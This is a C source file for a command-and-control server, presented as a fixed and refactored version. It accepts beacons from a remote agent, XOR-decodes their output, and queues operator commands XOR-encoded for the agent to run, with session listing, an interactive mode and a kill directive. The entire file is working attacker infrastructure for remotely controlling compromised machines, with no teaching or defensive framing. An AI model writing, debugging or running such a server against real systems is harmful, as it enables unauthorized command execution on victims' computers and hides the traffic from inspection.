/*
 * C2 Server — Fixed & Refactored
 *
 * Fixes applied:
 *   1. Response output prints immediately upon beacon receipt.
 *   2. select()-based multiplexing — stdin never blocks the beacon handler.
 *   3. WaitingForCommandResult flag gates output printing so idle beacons
 *      are silently acknowledged without polluting the operator terminal.
 *   4. Removed the strcmp(AgentResult,"Standby") guard on the print block —
 *      that guard was incorrectly suppressing real command output because
 *      the beacon cycle means the result arrives one cycle after the command
 *      is dispatched, during which the agent has already reset its status.
 *      The WaitingForCommandResult flag alone is sufficient.
 *   5. All identifiers, strings, and prompts are in English with PascalCase.
 */

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#define CloseSocket closesocket
#define SetNonBlocking(Fd)                                                     \
  {                                                                            \
    unsigned long NonBlockFlag = 1;                                            \
    ioctlsocket(Fd, FIONBIO, &NonBlockFlag);                                   \
  }
#define StdinFd _fileno(stdin)
#else
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <unistd.h>
#define CloseSocket close
#define SetNonBlocking(Fd) fcntl(Fd, F_SETFL, fcntl(Fd, F_GETFL, 0) | O_NONBLOCK)
typedef int SOCKET;
#define InvalidSocket -1
#define StdinFd STDIN_FILENO
#endif

#define BufferSize 4096
#define XorKey     0x5A

/* ── Cipher ──────────────────────────────────────────────────────────────── */

void ApplyXorCipher(char *Data, size_t DataLen)
{
    for (size_t Index = 0; Index < DataLen; Index++)
        Data[Index] ^= XorKey;
}

/* ── Terminal helpers ────────────────────────────────────────────────────── */

void ClearTerminal(void)
{
#ifdef _WIN32
    system("cls");
#else
    system("clear");
#endif
}

void PrintHelp(void)
{
    printf("\n  Management Console Commands\n");
    printf("  %-24s %s\n", "help",          "Display this command reference");
    printf("  %-24s %s\n", "clear",         "Wipe the terminal screen buffer");
    printf("  %-24s %s\n", "session",       "List all registered active agent sessions");
    printf("  %-24s %s\n", "use <id>",      "Enter interactive mode with target agent");
    printf("  %-24s %s\n", "interact <id>", "Alias for use <id>");
    printf("  %-24s %s\n", "exit",          "Shut down the C2 listener and exit\n");
}

/* ── Read one trimmed line from stdin ────────────────────────────────────── */

int ReadLine(char *OutBuffer, int Capacity)
{
    if (fgets(OutBuffer, Capacity, stdin) == NULL)
        return 0;
    OutBuffer[strcspn(OutBuffer, "\n")] = '\0';
    return 1;
}

/* ── Entry point ─────────────────────────────────────────────────────────── */

int main(int Argc, char *Argv[])
{
    /* ── Parse CLI flags ── */
    char BindAddress[64] = "0.0.0.0";
    int  ListenPort      = 8080;
    int  FlagCount       = 0;

    for (int Index = 1; Index < Argc; Index++) {
        if (strcmp(Argv[Index], "-s") == 0 && Index + 1 < Argc) {
            strncpy(BindAddress, Argv[Index + 1], sizeof(BindAddress) - 1);
            FlagCount++;
        }
        if (strcmp(Argv[Index], "-p") == 0 && Index + 1 < Argc) {
            ListenPort = atoi(Argv[Index + 1]);
            FlagCount++;
        }
    }

    if (FlagCount < 2) {
        fprintf(stderr, "Usage: %s -s <host> -p <port>\n", Argv[0]);
        return 1;
    }

#ifdef _WIN32
    WSADATA WsaStartupData;
    if (WSAStartup(MAKEWORD(2, 2), &WsaStartupData) != 0) {
        fprintf(stderr, "WSAStartup failed.\n");
        return 1;
    }
#endif

    /* ── Create and bind listen socket ── */
    SOCKET ServerSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (ServerSocket == InvalidSocket) {
        fprintf(stderr, "Failed to create server socket.\n");
        return 1;
    }

    struct sockaddr_in ServerAddress;
    memset(&ServerAddress, 0, sizeof(ServerAddress));
    ServerAddress.sin_family      = AF_INET;
    ServerAddress.sin_addr.s_addr = inet_addr(BindAddress);
    ServerAddress.sin_port        = htons(ListenPort);

    int ReuseOption = 1;
    setsockopt(ServerSocket, SOL_SOCKET, SO_REUSEADDR,
               (const char *)&ReuseOption, sizeof(ReuseOption));

    if (bind(ServerSocket, (struct sockaddr *)&ServerAddress,
             sizeof(ServerAddress)) < 0) {
        fprintf(stderr, "Bind failed on %s:%d\n", BindAddress, ListenPort);
        CloseSocket(ServerSocket);
        return 1;
    }

    if (listen(ServerSocket, 8) < 0) {
        fprintf(stderr, "Listen failed.\n");
        CloseSocket(ServerSocket);
        return 1;
    }

    SetNonBlocking(ServerSocket);

    /* ── Runtime state ── */
    char PendingCommand[BufferSize] = {0}; /* command queued by operator        */
    char AgentResult[BufferSize]    = {0}; /* last payload received from agent  */
    char SessionAddress[64]         = {0}; /* IP of the registered agent        */
    int  HasActiveSession           = 0;   /* agent has checked in at least once */
    int  InSessionMode              = 0;   /* operator is in interactive mode    */
    int  CommandIsPending           = 0;   /* command queued, not yet sent       */
    int  WaitingForCommandResult    = 0;   /* command sent, result not yet shown */

    printf("C2 Server listening on %s:%d\n", BindAddress, ListenPort);
    fflush(stdout);
    printf("C2Main> ");
    fflush(stdout);

    /* ── Main event loop ── */
    while (1) {

        fd_set ReadSet;
        FD_ZERO(&ReadSet);
        FD_SET(ServerSocket, &ReadSet);
        FD_SET(StdinFd, &ReadSet);

#ifdef _WIN32
        int MaxFd = 0;
#else
        int MaxFd = (ServerSocket > StdinFd ? ServerSocket : StdinFd);
#endif

        struct timeval Timeout;
        Timeout.tv_sec  = 0;
        Timeout.tv_usec = 100000; /* 100 ms */

        int SelectResult = select(MaxFd + 1, &ReadSet, NULL, NULL, &Timeout);
        if (SelectResult < 0)
            continue;

        /* ── Handle incoming agent beacon ── */
        if (FD_ISSET(ServerSocket, &ReadSet)) {
            struct sockaddr_in AgentSockAddr;
            socklen_t AgentAddrLen = sizeof(AgentSockAddr);

            SOCKET AgentSocket = accept(ServerSocket,
                                        (struct sockaddr *)&AgentSockAddr,
                                        &AgentAddrLen);

            if (AgentSocket != InvalidSocket) {
                char RecvBuffer[BufferSize] = {0};
                int  BytesReceived = recv(AgentSocket, RecvBuffer,
                                          BufferSize - 1, 0);

                if (BytesReceived > 0) {
                    ApplyXorCipher(RecvBuffer, BytesReceived);
                    strncpy(AgentResult, RecvBuffer, BufferSize - 1);

                    /* Register session on first beacon */
                    if (!HasActiveSession) {
                        HasActiveSession = 1;
                        strncpy(SessionAddress,
                                inet_ntoa(AgentSockAddr.sin_addr),
                                sizeof(SessionAddress) - 1);
                        if (InSessionMode) {
                            printf("\n[*] Agent re-registered from %s\n",
                                   SessionAddress);
                            printf("C2Session[%s]> ", SessionAddress);
                            fflush(stdout);
                        }
                    }

                    /*
                     * Dispatch queued command or tell agent to sleep.
                     *
                     * Beacon cycle:
                     *   Cycle N   — agent sends previous result (or Standby),
                     *               server dispatches PendingCommand,
                     *               sets WaitingForCommandResult = 1.
                     *   Cycle N+1 — agent sends the actual command output,
                     *               server prints it and clears the flag.
                     *
                     * We print whatever the agent sends on Cycle N+1 without
                     * filtering for "Standby" — that string is only sent on
                     * genuine idle cycles when WaitingForCommandResult is 0.
                     */
                    if (CommandIsPending && strlen(PendingCommand) > 0) {
                        size_t CmdLen = strlen(PendingCommand);
                        ApplyXorCipher(PendingCommand, CmdLen);
                        send(AgentSocket, PendingCommand, CmdLen, 0);
                        memset(PendingCommand, 0, BufferSize);
                        CommandIsPending        = 0;
                        WaitingForCommandResult = 1;
                    } else {
                        char SleepDirective[] = "SLEEP";
                        size_t SleepLen = strlen(SleepDirective);
                        ApplyXorCipher(SleepDirective, SleepLen);
                        send(AgentSocket, SleepDirective, SleepLen, 0);
                    }

                    /*
                     * Print output only when we are actively waiting for a
                     * command result. Idle Standby beacons are silently
                     * acknowledged — they arrive when WaitingForCommandResult
                     * is 0 so they never reach this block.
                     */
                    if (InSessionMode && WaitingForCommandResult) {
                        printf("\n[AgentResponse]\n%s\n", AgentResult);
                        fflush(stdout);
                        printf("C2Session[%s]> ", SessionAddress);
                        fflush(stdout);
                        WaitingForCommandResult = 0;
                    }
                }

                CloseSocket(AgentSocket);
            }
        }

        /* ── Handle operator keyboard input ── */
        if (FD_ISSET(StdinFd, &ReadSet)) {
            char InputLine[BufferSize] = {0};

            if (!ReadLine(InputLine, sizeof(InputLine)))
                continue;

            if (InSessionMode) {

                if (strcmp(InputLine, "back") == 0) {
                    InSessionMode           = 0;
                    WaitingForCommandResult = 0;
                    printf("C2Main> ");
                    fflush(stdout);

                } else if (strcmp(InputLine, "clear") == 0) {
                    ClearTerminal();
                    printf("C2Session[%s]> ", SessionAddress);
                    fflush(stdout);

                } else if (strcmp(InputLine, "exit") == 0) {
                    strncpy(PendingCommand, "kill", BufferSize - 1);
                    CommandIsPending        = 1;
                    WaitingForCommandResult = 0;
                    HasActiveSession        = 0;
                    InSessionMode           = 0;
                    memset(SessionAddress, 0, sizeof(SessionAddress));
                    printf("[*] Kill directive queued. Returning to main console.\n");
                    printf("C2Main> ");
                    fflush(stdout);

                } else if (strlen(InputLine) > 0) {
                    strncpy(PendingCommand, InputLine, BufferSize - 1);
                    CommandIsPending        = 1;
                    WaitingForCommandResult = 0;
                    printf("[*] Command queued — awaiting next agent beacon...\n");
                    fflush(stdout);

                } else {
                    printf("C2Session[%s]> ", SessionAddress);
                    fflush(stdout);
                }

            } else {

                if (strcmp(InputLine, "help") == 0) {
                    PrintHelp();

                } else if (strcmp(InputLine, "clear") == 0) {
                    ClearTerminal();

                } else if (strcmp(InputLine, "exit") == 0) {
                    printf("Shutting down C2 listener. Goodbye.\n");
                    break;

                } else if (strcmp(InputLine, "session") == 0) {
                    if (HasActiveSession)
                        printf("  ID: 1  |  Target: %s  |  Status: Active\n",
                               SessionAddress);
                    else
                        printf("  No active sessions registered.\n");

                } else if (strcmp(InputLine, "use 1")      == 0 ||
                           strcmp(InputLine, "interact 1") == 0 ||
                           strcmp(InputLine, "use")        == 0 ||
                           strcmp(InputLine, "interact")   == 0) {

                    if (HasActiveSession) {
                        InSessionMode           = 1;
                        WaitingForCommandResult = 0;
                        printf("[*] Entering session with %s\n", SessionAddress);
                        printf("[*] Type 'back' to return to the main console.\n");
                        printf("C2Session[%s]> ", SessionAddress);
                        fflush(stdout);
                        continue;
                    } else {
                        printf("[!] Error: No active session with that ID.\n");
                    }

                } else if (strlen(InputLine) > 0) {
                    printf("[!] Unknown command. Type 'help' for usage.\n");
                }

                printf("C2Main> ");
                fflush(stdout);
            }
        }
    }

    CloseSocket(ServerSocket);
#ifdef _WIN32
    WSACleanup();
#endif
    return 0;
}
